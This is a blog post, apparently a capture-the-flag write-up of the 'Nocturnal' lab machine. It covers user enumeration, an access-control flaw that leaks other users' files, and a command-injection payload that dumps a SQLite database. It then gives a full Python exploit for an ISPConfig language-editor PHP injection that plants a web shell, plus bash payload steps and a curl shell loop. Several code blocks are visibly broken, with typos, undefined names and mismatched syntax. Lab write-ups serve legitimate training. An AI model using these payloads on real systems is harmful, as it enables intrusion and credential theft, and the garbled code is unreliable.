---
layout: post
title: "Nocturnal-Linux-Easy"
date:   2025-08-17 8:05:57 -0400
categories: writeups
thumb: /assets/images/logos/f6a56cec6e9826b4ed124fb4155abc66.png
---

# Nocturnal

# 1. Enumeration

Start by enumerating the open ports on this machine
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image.png' | relative_url }})
<br/><br/>
Only two ports are open, one running SSH and other hosting a web application service. This web application is designed to upload office or PDF files  
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_1.png' | relative_url }})
<br/><br/>
Register an account to inspect what actions could be executed as a normal user
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_2.png' | relative_url }})
<br/><br/>
We also proceed to enumerate directories but nothing of interest was found
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_3.png' | relative_url }})
<br/><br/>
Upload a file and capture the request using `Burpsuite` to inspect what it is going on 
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_4.png' | relative_url }})
<br/><br/>
# 2. User flag
<br/><br/>
A normal `.pdf` file was uploaded
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_5.png' | relative_url }})
<br/><br/>
The GET request used to access the uploaded file includes the username and the name file to locate the required file
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_6.png' | relative_url }})
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_7.png' | relative_url }})
<br/><br/>
However we can’t access files outside the user’s directory
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_8.png' | relative_url }})
<br/><br/>
This is way to enumerate users, as the response returns different messages depending whether a user exists or not, `fuzz` the username parameter in this request
<br/><br/>

```python
wfuzz -u 'http://nocturnal.htb/view.php?username=FUZZ&file-doesnotexist.pdf' -H 'Cookie: cookie' -w wordlist --hh hidecharacters
```

<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_9.png' | relative_url }})
<br/><br/>
When we request a file for amanda, the web server displays a message disclosing user’s updated files. The backend does not validate the identity of the entity performing the request through the cookie. This allows us to access other users’ uploads and exfiltrate their information like the admin password
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_10.png' | relative_url }})
<br/><br/>
Now we have access to the admin panel, here we can review the source code of the page, this could lead to a security breach by exposing direct vulnerabilities
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_11.png' | relative_url }})
<br/><br/>
We can also create back ups of this page source
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_12.png' | relative_url }})
<br/><br/>
In the login.php the database file is disclosed
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_13.png' | relative_url }})

<br/><br/>
In `admin.php` we can see how the backup is generated, it is created by a command executed by `proc_open` funcion, the password field is not sanitized at all, it allows us to break out the normal command flow of the command using a `“` , enabling arbitrary command execution outside of the zip command. However we also need to consider the clean entry function which removes characters like `;`  - `&` -   ``etc.
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_14.png' | relative_url }})
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_15.png' | relative_url }})
<br/><br/>
Use the following payload to exfiltrate database information, to bypass clean entry function we will use `TAB` urlencoded
<br/><br/>
```python
"sqlite3%09../nocturnal_database/nocturnal_database.db%09.dump"
```
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_16.png' | relative_url }})
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_17.png' | relative_url }})
<br/><br/>
Crack the hashes found to gain access as tobias through SSH
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_18.png' | relative_url }})
<br/><br/>
# 3.Priv esc
<br/><br/>
As `tobias` we can access to internal services that weren’t available before
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_19.png' | relative_url }})
<br/><br/>
In `localhost:8080` there is a web application with a login form, let’s proceed to forward it
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_20.png' | relative_url }})
<br/><br/>
`IPSCONFIG` is a control panel for linux servers, access it using the credentials obtained previously
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_21.png' | relative_url }})
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_22.png' | relative_url }})
<br/><br/>
While checking around, specifically in monitor section, an error is displayed revealing the current version of the software
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_23.png' | relative_url }})
<br/><br/>
Search on internet for vulnerabilities related with this version
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_24.png' | relative_url }})
<br/><br/>
If the admin can edit language it means we will have access as root in the machine
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_25.png' | relative_url }})
<br/><br/>
Use the following script to exploit this vulnerability and spawn a shell with elevated privileges
<br/><br/>

```python
import requests
import sys
import base64
import string
import random

def ensure_url_format(url):
	if not url.startswith(("http://","https://")):
		raise ValueError("Url must start with http:// or https://")
	if no url.endswith("/"):
		url += "/"
	
	return url
	
def login(url, user, password, session):
	
	login_url = f"{url}login/"
	data = {
		'username':user,
		'password':password,
		's_mod':'login'
	}
	
	resp = session.post(login_url, data=data, verify=False)
	if 'Usename or password wrong' in resp.text:
		sys.exit('Login failed!!')
	print("[*] Login successful!")

def get_csrf_tokens(url, session, lang_file):
	print('[*] Fetching CSRF tokens..')
	target_url = f"{url}admin/language_edit.php"
	data = {
		'lang':'en',
		'module':'help',
		'lang_file':lang_file
	}
	resp = session.post(target_url, data=data, verify=False)
	
	csrf_id_match = re.search(r'_csrf_id" value="([^"]+)"', resp.text)
	csrf_key_match = re.search(r'_csrf_key" value="([^"])+)"', resp.text)
	
	if not csrf_id_match or not csrf_key_match:
		sys.exit("[-] CSRF tokens not found!")
	
  print(f"[+] CSRF ID: {csrf_id_match.group(1)}")
  print(f"[+] CSRF Key: {csrf_key_match.group(1)}")
  return csrf_id_match.group(1), csrf_key_match.group(1)
  

def inject_shell(url, session, lang_file, csrf_id, csrf_key):
	
	payload = base64.b64encode(b"<?php print('___'); passthru(base64_decode(\$_SERVER['HTTP_C'])); print('___';) ?>").decode()  
	injection = f"'];file_put_contents('sh.php',base64_decode('{payload}'));die;#"
	
	data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file,
        '_csrf_id': csrf_id,
        '_csrf_key': csrf_key,
        'records[\\]': injection
    }
		resp = session.post(f"{url}admin/language_edit.php", data=data, verify=False)

    if resp.status_code == 200:
        print(f"[+] Shell written to: {url}admin/sh.php")
    else:
        print(f"[-] Failed to send payload, HTTP {resp.status_code}")
        
 def launch_shell(url, session):
	 print("[+] Lauching shell...")
	 shell_url = f"{url}admin/sh.php"
	 
	 while True:
		 try:
			 cmd = input("\nispconfig-shell@#")
			 if cmd.strip().lower() == "exit":
				 break
			 
			 headers = {'C': base64.b64encode(cmd.encode()).decode()}
			 resp = session.get(shell_url, headers=headers, verify=False)
			 output = re.search(r'___(.*)___', resp.text, re.DOTALL)
						 
			 if output:
			         print(output.group(1).strip())
			     else:
			         print("[-] Exploit failed or no output.")
	 	except KeyboardInterrupt:
		  break   

if __name__ == "__main__":
	if len(sys.argv) != 4:
		sys.exit(f"\nUsage: python {sys.argv[0]} <url> <Username> <passowrd>\n")
		
	url, user, password = sys.argv[1], sys.argv[2], sys.argv[3]
	
	#Disable SSL warnings
	requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
	
	url = ensure_url_format(url)
	session = requests.Session()
	session = login(nice_url, user, password, session)
	
	lang_file = ''.join(random.choices(string.ascii_lowercase,k=8)) + '.lng'
	csrf_id, csrf_key = get_csrf_tokens(url, session, lang_file)
	inject_shell(url,session, lang_file, csrf_id, csrf_key)
	launch_shell(url,session)
```

<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_26.png' | relative_url }})
<br/><br/>
We can also exploit this php injection manually. First we need to retrieve `CSRF` validation tokens by  simulating an edit of a random `lang_file` 
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_27.png' | relative_url }})
<br/><br/>
The next step is to prepare our payload, we will use variables for a better understanding of each part of the injection
<br/><br/>

```bash
SHELL_NAME="rev.php"
#Take the content of the C header and execute it as system
PHP_PAYLOAD="<?php echo '___'; system(base64_decode(\$_SERVER['HTTP_C'])); echo '___'; ?>"
#Base 64 enconde the payload
ENCODED=$(echo -n "$PHP_PAYLOAD"| base64 -w0)
#Upload the file that is expecting the malicious header to then execute it
INJECT="']file_put_contents('$SHELL_NAME',base64_decode('$ENCODED'));die;#"
#Encode the injection to support url formating -s oneline -R raw -r plaintext @uri=urlencode
ENCODED_INJECT=$(prinf '%s' "$INJECT" | jq -s -R -r @uri)
```

<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_28.png' | relative_url }})
<br/><br/>
Now, we can inject the payload in the vulnerable `records[\]` POST parameter
<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_33a2d5ab_d502_4b18_aac1_d72cf4c07bca.png' | relative_url }})
<br/><br/>
The file is uploaded successfully, we can execute code sending requests to out malicious injection (`rev.php`) passing commands in `C` header 
<br/><br/>

```bash
ENCODED=$(echo -n "id" | base64 -w0)
RESP=%(curl -sk -H "C: $ENCODED" "http://127.0.0.1:8000/admin/rev.php")
echo $RESP
```

<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_f78240ef_fa79_477c_9fe3_07e1a660b7a3.png' | relative_url }})
<br/><br/>
Or automating a shell in bash
<br/><br/>

```bash
while true; do
	echo -en "ispconfig-shell# "
	read -r CMD || continue
	[[ "$CMD" == "exit" ]] && break
	
	ENCODED=$(echo -n "id" | base64 -w0)
	RESP=%(curl -sk -H "C: $ENCODED" "http://127.0.0.1:8000/admin/rev.php")
	
	PAYLOAD=$(echo "$RESP" | grep -ozP '(?<=___)(.|\n)*?(?=___)' | tr -d '\0')
	if [[ -n "$PAYLOAD"]]; do
		echo "$PAYLOAD"
	else
		echo "[!] No output detected"
	fi
	
	echo ""
done
	
```

<br/><br/>
![image.png]({{ '/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_40fd6f42_d0fd_4b10_acc6_4abcccb0a23b.png' | relative_url }})
<br/><br/>
Machine pwned@!@!#

<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>


<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
